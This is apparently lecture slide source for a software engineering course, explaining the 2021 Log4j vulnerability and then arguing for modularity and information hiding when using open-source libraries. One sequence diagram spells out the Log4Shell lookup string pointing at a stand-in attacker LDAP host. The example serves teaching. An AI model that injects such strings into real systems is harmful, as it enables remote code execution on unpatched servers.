...
<p style={{fontSize: '0.85em'}}>
In December 2021, a critical vulnerability in <strong>Log4j</strong> — a ubiquitous Java logging library — exposed millions of systems to remote code execution. This is the supply chain attack that changed how the industry thinks about dependencies.
</p>
...
sequenceDiagram
    ...
    participant Log4j
    participant LDAP as Attacker's LDAP Server
    participant Malware as Malicious Code

    Attacker->>YourApp: Send malicious string in any logged field<br/>(username, search query, User-Agent...)
    YourApp->>Log4j: log.info("User login: " + username)
    Note over Log4j: Log4j sees ${jndi:ldap://evil.com/a}<br/>and EXECUTES it as a lookup
    Log4j->>LDAP: Fetch ldap://evil.com/a
    LDAP->>Log4j: Return reference to Malware.class
    Log4j->>Malware: Load and execute attacker's code
    Note over Malware: Full control of your server
```

</div>

<div className="fragment" style={{marginTop: '0.75em', padding: '0.5em', border: '2px solid #FF9800', borderRadius: '8px', fontSize: '0.75em'}}>
...
You wouldn't pass user input directly to dangerous operations. But <strong>logging doesn't feel dangerous</strong>.
</p>

<div style={{fontSize: '0.63em', marginTop: '0.75em'}}>
...
<div className="fragment" style={{fontSize: '0.55em', marginTop: '0.75em'}}>

```mermaid
graph LR
    subgraph "Your Mental Model"
        Input["User Input"] -->|"Obviously dangerous"| Exec["Runtime.exec()"]
        Input -->|"Obviously dangerous"| File["File operations"]
        Input -->|"It's just text..."| Log["log.info()"]
    end

    subgraph "Log4j's Reality"
        Log -->|"Parse for ${...}"| Lookup["Variable Lookup"]
        Lookup -->|"Execute JNDI"| Network["Network Request"]
        Network -->|"Load class"| RCE["Code Execution"]
    end

    style Log fill:#FF980044,stroke:#FF9800,stroke-width:3px
    style RCE fill:#f4433644,stroke:#f44336
```

</div>

<div className="fragment" style={{marginTop: '0.5em', padding: '0.5em', backgroundColor: 'rgba(244, 67, 54, 0.1)', borderRadius: '8px', fontSize: '0.75em'}}>
...
{/* ============================================ */}
{/* ARC 4: MODULARITY, BOUNDARIES, AND THE BAZAAR */}
{/* ============================================ */}
...
<p style={{fontSize: '0.85em'}}>
The bazaar model only works because of <strong>information hiding</strong>. Every successful OSS library is a module with a clean boundary.
</p>
...
```mermaid
graph LR
    You["Your Code"] -->|"ObjectMapper API"| Jackson["Jackson Internals<br/>(hidden)"]
    You -->|"DataSource API"| HikariCP["HikariCP Internals<br/>(hidden)"]
    You -->|"HttpClient API"| OkHttp["OkHttp Internals<br/>(hidden)"]

    style Jackson fill:#9370DB22,stroke:#9370DB
    style HikariCP fill:#9370DB22,stroke:#9370DB
    style OkHttp fill:#9370DB22,stroke:#9370DB
```
...
<p style={{fontSize: '0.85em'}}>
If your code violates information hiding, you <strong>can't swap components</strong> — even when better alternatives exist.
</p>

<div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.5em', marginTop: '1em', fontSize: '0.62em'}}>
...
<div className="fragment" style={{marginTop: '1em', fontSize: '0.8em', fontWeight: 'bold', color: '#FF9800'}}>
...
<p style={{fontSize: '0.85em'}}>
Good boundaries don't just help you <strong>consume</strong> OSS — they're what make your code <strong>reusable</strong> in the first place.
</p>
...
```mermaid
graph TD
    subgraph "Well-modularized system"
        A["Web Controller"] --> B["Business Logic"]
        B --> C["Data Access"]
        B --> D["Email Service"]
        B --> E["PDF Generator"]
    end

    subgraph "Reusable as OSS?"
        E -.->|"Clean interface,<br/>no hidden coupling"| OSS["✅ Extract as library"]
        D -.->|"Depends only on<br/>its own interface"| OSS2["✅ Extract as library"]
        A -.->|"Coupled to Spring MVC,<br/>business objects"| NOPE["❌ Too entangled"]
    end
```

</div>

<div className="fragment" style={{marginTop: '0.5em', fontSize: '0.75em'}}>
...
<div className="fragment" style={{marginTop: '0.5em', padding: '0.5em', border: '2px solid #9370DB', borderRadius: '8px', fontSize: '0.8em'}}>
...
```mermaid
graph LR
    IH["Information Hiding<br/>(L17)"] -->|"enables"| CB["Clean Boundaries<br/>(L18)"]
    CB -->|"enables"| SW["Swappable<br/>Components"]
    SW -->|"enables"| BA["Bazaar Adoption<br/>(L23)"]
    BA -->|"enables"| RE["Reuse at Scale"]
    RE -->|"demands"| IH

    style IH fill:#9370DB22,stroke:#9370DB
    style CB fill:#4CAF5022,stroke:#4CAF50
    style SW fill:#FF980022,stroke:#FF9800
    style BA fill:#2196F322,stroke:#2196F3
    style RE fill:#E91E6322,stroke:#E91E63
```

</div>

<div style={{marginTop: '1em', fontSize: '0.78em'}}>

<p>Every principle we've studied this semester reinforces the others:</p>

<ul>
  <li><strong>Information hiding</strong> lets strangers' code work together without understanding each other's internals</li>
  <li><strong>Clean boundaries</strong> let you swap one library for another when licenses change, maintainers disappear, or better options emerge</li>
  <li><strong>Modularity</strong> is what lets a single developer in Tokyo publish a component on Monday that teams worldwide adopt by Friday</li>
  <li><strong>Testability</strong> depends on all of the above — can you mock that dependency? Only if you injected it (L17) behind a clean interface (L18)</li>
</ul>

</div>

<div className="fragment" style={{marginTop: '0.75em', padding: '0.75em', backgroundColor: 'rgba(147, 112, 219, 0.1)', borderRadius: '8px', fontSize: '0.85em', fontWeight: 'bold'}}>

The bazaar doesn't work without modularity. And modularity doesn't matter without the bazaar to supply the components. They need each other. Every time you type <code style={{fontWeight: 'normal'}}>implementation 'some:library:1.0'</code>, you're making an architectural decision. Evaluate it like one.
